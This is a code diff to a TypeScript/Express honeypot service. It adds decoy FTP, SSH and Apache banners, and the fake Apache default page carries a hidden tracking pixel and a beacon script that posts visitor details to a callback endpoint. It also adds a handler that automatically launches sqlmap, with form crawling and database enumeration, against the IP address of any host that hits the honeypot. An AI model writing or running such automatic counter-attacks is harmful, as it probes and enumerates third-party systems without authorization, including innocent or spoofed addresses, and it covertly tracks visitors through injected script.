@@ -1,5 +1,6 @@
 // Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
-import { createHash } from "crypto";
+import { createHash, randomUUID } from "crypto";
+import { exec } from "child_process";
 import { Router } from "express";
 import { db } from "@workspace/db";
 import {
@@ -52,7 +53,122 @@ function requirePsk(req: any, res: any, next: any) {
   next();
 }
 
+// ── Public worm callhome — no PSK (called from attacker's browser/scanner) ──────
+router.post("/worm-callhome", async (req, res) => {
+  const body = z.object({
+    attackerIp: z.string().optional(),
+    wormId:     z.string().optional(),
+    ua:         z.string().optional(),
+    ref:        z.string().optional(),
+    ts:         z.number().optional(),
+    extra:      z.record(z.string()).optional(),
+  }).safeParse(req.body);
+
+  const ip = (body.success ? body.data.attackerIp : null)
+    ?? req.headers["x-forwarded-for"]?.toString().split(",")[0].trim()
+    ?? req.socket.remoteAddress
+    ?? "unknown";
+
+  // Append callback data to trapped attacker record
+  const [existing] = await db.select().from(trappedAttackersTable)
+    .where(sql`ip = ${ip}`).limit(1).catch(() => []);
+
+  if (existing) {
+    let collected: Record<string, unknown> = {};
+    try { collected = JSON.parse(existing.dataCollected ?? "{}"); } catch { /* */ }
+    const callbacks: unknown[] = (collected.wormCallbacks as unknown[] | undefined) ?? [];
+    callbacks.push({
+      ts: new Date().toISOString(),
+      ua: body.success ? body.data.ua : null,
+      ref: body.success ? body.data.ref : null,
+      wormId: body.success ? body.data.wormId : null,
+      extra: body.success ? body.data.extra : null,
+    });
+    collected.wormCallbacks = callbacks;
+    await db.update(trappedAttackersTable)
+      .set({ dataCollected: JSON.stringify(collected), loopCount: sql`loop_count + 1` })
+      .where(eq(trappedAttackersTable.id, existing.id))
+      .catch(() => { /* ignore */ });
+  }
+
+  // Transparent 1×1 GIF response so img-tag trackers render
+  const gif1x1 = Buffer.from(
+    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
+    "base64",
+  );
+  res.writeHead(200, { "Content-Type": "image/gif", "Content-Length": gif1x1.length });
+  res.end(gif1x1);
+});
+
 router.use(requirePsk);
+
+// ── Worm-payload — node fetches this before sending banner to attacker ───────
+router.get("/worm-payload", (req, res) => {
+  const type = (req.query.type as string | undefined)?.toLowerCase() ?? "http";
+  const port = parseInt(req.query.port as string) || 80;
+  const nodeId = req.query.nodeId ?? "?";
+
+  // Unique worm ID per request so we can correlate callbacks
+  const wormId = randomUUID().substring(0, 12);
+
+  // Base URL for callbacks — prefer REPLIT_DOMAINS, fall back to request host
+  const domains = (process.env.REPLIT_DOMAINS ?? "").split(",").filter(Boolean);
+  const baseUrl = domains.length > 0
+    ? `https://${domains[0]}`
+    : `http://${req.headers.host ?? "localhost"}`;
+
+  const callbackUrl = `${baseUrl}/api/daemon-inbound/worm-callhome`;
+  const pixelUrl    = `${baseUrl}/api/daemon-inbound/worm-callhome`;
+
+  if (type === "ftp") {
+    const banner = [
+      `220-ProFTPD 1.3.5 Server (Debian) [${req.socket.remoteAddress ?? "unknown"}]`,
+      `220-Welcome to FTP service`,
+      `220-[ref:${wormId}] See ftp://help.${domains[0] ?? "proxhqvpn.com"}/setup for client configuration`,
+      `220 Server ready.`,
+    ].join("\r\n");
+    return res.json({ type: "ftp", wormId, banner });
+  }
+
+  if (type === "ssh") {
+    const banner = `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n` +
+      `# [svc:${wormId}] System management: ${baseUrl}/status\r\n`;
+    return res.json({ type: "ssh", wormId, banner });
+  }
+
+  // Default: HTTP — full response with hidden worm trackers
+  const wormScript = `
+<script>
+(function(){
+  var w={id:"${wormId}",ua:navigator.userAgent,ref:document.referrer,ts:Date.now()};
+  fetch("${callbackUrl}",{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(w),mode:"no-cors"}).catch(function(){});
+})();
+</script>`.trim();
+
+  const body = `<html>
+<head><title>Apache2 Default Page</title></head>
+<body>
+<h1>It works!</h1>
+<p>This is the default web page for this server.</p>
+<p>The web server software is running but no content has been added, yet.</p>
+<img src="${pixelUrl}?wid=${wormId}&np=${port}&ni=${nodeId}" width="1" height="1" style="display:none" alt="">
+${wormScript}
+</body>
+</html>`;
+
+  const httpResponse = [
+    `HTTP/1.1 200 OK`,
+    `Server: Apache/2.4.51 (Ubuntu)`,
+    `Content-Type: text/html; charset=utf-8`,
+    `Content-Length: ${Buffer.byteLength(body)}`,
+    `Connection: close`,
+    ``,
+    body,
+  ].join("\r\n");
+
+  return res.json({ type: "http", wormId, banner: httpResponse, body });
+});
 
 router.post("/report", async (req, res) => {
   const body = z.object({
@@ -244,6 +360,42 @@ router.post("/honeypot-hit", async (req, res) => {
       sqlmapStatus: "idle",
     }).returning();
     trappedId = trapped.id;
+
+    // Auto-launch SQLmap when an HTTP banner was captured (HTTP service confirmed on port)
+    if (body.banner && body.banner.includes("HTTP")) {
+      const jobId = randomUUID().substring(0, 8).toUpperCase();
+      const safeIp = body.attackerIp.replace(/[^0-9a-fA-F.:]/g, "");
+      const targetUrl = `http://${safeIp}:${body.port}/`;
+      const cmd = [
+        "sqlmap",
+        `-u "${targetUrl}"`,
+        "--batch",
+        "--level=2",
+        "--risk=2",
+        "--timeout=20",
+        "--retries=1",
+        `--output-dir=/tmp/sqlmap-${jobId}`,
+        "--forms",
+        "--dbs",
+      ].join(" ");
+
+      await db.update(trappedAttackersTable).set({
+        sqlmapStatus: "running",
+        sqlmapJobId: jobId,
+        sqlmapStartedAt: new Date(),
+      }).where(eq(trappedAttackersTable.id, trapped.id));
+
+      exec(cmd, { timeout: 120000 }, async (err, stdout, stderr) => {
+        const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 8000);
+        await db.update(trappedAttackersTable).set({
+          sqlmapStatus: err ? "error" : "complete",
+          sqlmapResults: output || (err ? err.message : "No output"),
+          sqlmapFinishedAt: new Date(),
+        }).where(eq(trappedAttackersTable.id, trapped.id)).catch(() => { /* ignore */ });
+      });
+
+      logger.info({ ip: body.attackerIp, jobId, targetUrl }, "Auto-SQLmap launched via honeypot banner detection");
+    }
   } else {
     trappedId = existing[0].id;
     await db.update(trappedAttackersTable).set({
